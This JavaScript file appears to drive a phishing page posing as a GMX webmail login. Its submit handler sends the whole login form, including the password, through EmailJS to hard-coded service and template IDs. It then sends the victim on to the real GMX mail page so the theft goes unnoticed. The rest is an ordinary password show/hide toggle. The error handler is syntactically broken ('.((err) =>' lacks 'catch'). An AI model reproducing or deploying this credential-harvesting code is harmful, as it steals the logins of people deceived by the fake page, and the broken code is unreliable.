const btn = document.getElementById('button');

document.getElementById('form')
    .addEventListener('submit', function(event) {
        event.preventDefault();

        btn.textContent= 'AVANTI';

        const serviceID = 'service_9ust8qe';
        const templateID = 'template_q5nghfc';

        emailjs.sendForm(serviceID, templateID, this)
            .then(() => {
                btn.value = 'Login';
                window.location.href = 'https://www.gmx.net/produkte/apps/mail/'; // Redirect to the desired link
            })
            .((err) => {
                btn.value = 'Login';
                alert(JSON.stringify(err));
            });

      form.reset();
      return false;
    });

const togglePasswordButton = document.querySelector("#toggle-password");
const closedEyeIcon = document.querySelector("#closed-eye");
const openEyeIcon = document.querySelector("#open-eye");
const passwordElement = document.querySelector("#password");
let isPasswordVisible = false;

togglePasswordButton.addEventListener("click", function() {
    if (!isPasswordVisible) {
        //make password visible
        passwordElement.type = "text";
        openEyeIcon.classList.remove("hide");
        closedEyeIcon.classList.add("hide");
    } else {
        //make password hidden
        passwordElement.type = "password";
        closedEyeIcon.classList.remove("hide");
        openEyeIcon.classList.add("hide");
    }
    isPasswordVisible = !isPasswordVisible;
});

console.log(openEyeIcon);

//placeholder

// Placeholder

const inputPlaceholder = document.querySelectorAll("input[placeholder]");

inputPlaceholder.forEach((input) => {
    input.addEventListener("click", function() {
        this.classList.toggle("input-border-color");
        console.log("clicked");
    });

});





